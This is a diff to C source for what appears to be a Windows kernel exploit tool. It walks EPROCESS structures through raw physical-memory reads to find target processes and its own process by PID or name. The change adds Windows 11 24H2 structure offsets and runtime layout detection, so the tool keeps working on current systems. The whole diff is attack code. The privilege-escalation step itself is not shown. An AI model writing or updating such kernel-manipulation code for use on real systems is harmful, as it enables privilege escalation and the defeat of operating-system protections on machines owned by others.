@@ -281,6 +281,8 @@ static uint64_t find_kernel_cr3(uint64_t nt_va)
  * ══════════════════════════════════════════════════════════════════════════ */
 
 #define OFF_DTB   0x028u
+/* NOTE: OFF_PID/OFF_FLINK/OFF_NAME are Win10 defaults kept for legacy callers;
+ * find_proc_pa detects the correct offsets dynamically at runtime. */
 #define OFF_PID   0x440u
 #define OFF_FLINK 0x448u
 #define OFF_NAME  0x5A8u
@@ -300,7 +302,8 @@ static void enable_debug_priv(void)
 static uint64_t scan_eproc_physical(uint32_t pid, const char *name)
 {
     static const struct { uint32_t off_pid, off_name; } layouts[] = {
-        {0x440, 0x5A8},   /* Win10-1903+ / Win11 incl. 26200 */
+        {0x1D0, 0x338},   /* Win11 24H2+ (build 26100+) incl. 26200 */
+        {0x440, 0x5A8},   /* Win10-1903+ / Win11 pre-24H2 */
         {0x2E8, 0x450},   /* Win10-1709/1803/1809 */
         {0x2E0, 0x448},   /* Win10-1507-1703 */
     };
@@ -326,7 +329,7 @@ static uint64_t scan_eproc_physical(uint32_t pid, const char *name)
                 if ((fl >> 48) != 0xFFFF || (bl >> 48) != 0xFFFF) continue;
                 if ((fl & 7) || (bl & 7) || fl == bl) continue;
 
-                for (int li = 0; li < 3; li++) {
+                for (int li = 0; li < 4; li++) {
                     int64_t ep = (int64_t)off - (int64_t)layouts[li].off_pid;
                     if (ep < 0) continue;
                     uint64_t nm_off = (uint64_t)ep + layouts[li].off_name;
@@ -411,21 +414,34 @@ static uint64_t find_own_eproc_pa(void)
 
 static uint64_t find_proc_pa(uint64_t start_pa, const char *tname, uint32_t tpid)
 {
+    /* Detect layout from start_pa: Win11 24H2+ flink@0x1D8, Win10 flink@0x448 */
+    uint32_t fl_off = 0, pid_off = 0, nm_off = 0;
+    {
+        uint64_t v = 0;
+        phys_read(start_pa + 0x1D8, &v, 8);
+        if ((v >> 48) == 0xFFFF) { fl_off = 0x1D8; pid_off = 0x1D0; nm_off = 0x338; }
+        else {
+            v = 0; phys_read(start_pa + 0x448, &v, 8);
+            if ((v >> 48) == 0xFFFF) { fl_off = 0x448; pid_off = 0x440; nm_off = 0x5A8; }
+        }
+    }
+    if (!fl_off) return 0; /* could not detect layout */
+
     uint8_t buf[0x5C0];
     uint64_t cur = start_pa;
     for (int iter = 0; iter < 2048; iter++) {
         if (!phys_read(cur, buf, sizeof buf)) break;
-        uint64_t fl; memcpy(&fl, buf + OFF_FLINK, 8);
+        uint64_t fl; memcpy(&fl, buf + fl_off, 8);
         if ((fl >> 48) != 0xFFFF) break;
-        uint64_t next_kva = fl - OFF_FLINK;
+        uint64_t next_kva = fl - fl_off;
         uint64_t next_pa  = kva_to_pa(next_kva);
         if (!next_pa || next_pa == start_pa) break;
 
         uint8_t nb[0x5C0];
         if (!phys_read(next_pa, nb, sizeof nb)) { cur = next_pa; continue; }
 
-        uint64_t pv; memcpy(&pv, nb + OFF_PID, 8);
-        char nm[16] = {0}; memcpy(nm, nb + OFF_NAME, 15);
+        uint64_t pv; memcpy(&pv, nb + pid_off, 8);
+        char nm[16] = {0}; memcpy(nm, nb + nm_off, 15);
 
         if ((tpid && (uint32_t)pv == tpid) || (tname && _stricmp(nm, tname) == 0)) {
             printf("  [+] Found '%s' PID=%u  PA=0x%012"PRIX64"\n",
